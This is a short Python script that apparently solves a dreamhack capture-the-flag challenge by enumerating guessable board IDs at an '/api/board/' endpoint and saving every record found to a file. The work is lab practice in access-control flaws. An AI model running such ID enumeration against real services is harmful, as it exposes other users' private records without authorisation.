import requests

TEST_LOC = ''

if TEST_LOC == 'local':
    HOST = 'http://127.0.0.1'
    PORT = '8080'
else:
    HOST = 'http://host3.dreamhack.games'
    PORT = '18324'

ATTACK_URI = '/api/board/'
PATTERN_1 = '63724b'
PATTERN_2 = 'ea4127af5968fcb'


for idx in range(0x8f, 0x95):
    for idy in range(0x00, 0x10):
        PAYLOAD = ATTACK_URI + PATTERN_1 + f'{idx:x}' + PATTERN_2 + f'{idy:x}'
        resp = requests.get(HOST + ':' + PORT + PAYLOAD)
        with open('./result.txt', 'a') as f:
            if resp.text != """{"error":"board not found"}""":
                f.write(resp.text)
                f.write('\n')